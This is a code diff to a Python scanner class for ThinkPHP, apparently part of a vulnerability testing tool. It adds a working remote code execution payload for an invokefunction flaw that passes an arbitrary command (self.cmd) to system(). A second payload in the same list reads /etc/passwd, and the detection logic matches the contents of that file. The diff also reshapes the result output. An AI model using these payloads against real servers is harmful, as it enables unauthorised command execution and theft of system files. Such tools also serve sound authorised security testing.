@@ -89,6 +89,11 @@ class ThinkPHP():
         self.cve_2018_1002015_payloads = [
             {
                 'path': 'index.php?s=index/\\think\\Container/invokefunction',
+                'data': 'function=call_user_func_array&vars[0]=system&vars[1][]='+self.cmd,
+                'headers': head.merge(self.headers, {})
+            },
+            {
+                'path': 'index.php?s=index/\\think\\Container/invokefunction',
                 'data': 'function=call_user_func_array&vars[0]=system&vars[1][]=cat /etc/passwd',
                 'headers': head.merge(self.headers, {})
             },
@@ -239,12 +244,7 @@ class ThinkPHP():
                 results = {
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
-                    'Method': vul_info['vul_method'],
-                    'Payload': {
-                        'Url': url,
-                        'Path': path,
-                        'Data': data
-                    }
+                    'Payload': res
                 }
                 return results
 
@@ -401,18 +401,14 @@ class ThinkPHP():
                 return None
 
             if (('root:x:0:0:root' in res.text) 
+                or (self.md in check.check_res(res.text, self.md))
                 or (('PHP Version' in res.text) 
                     and ('PHP License' in res.text))
             ):
                 results = {
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
-                    'Method': vul_info['vul_method'],
-                    'Payload': {
-                        'Url': url,
-                        'Path': path,
-                        'Data': data
-                    }
+                    'Payload': res
                 }
                 return results
 
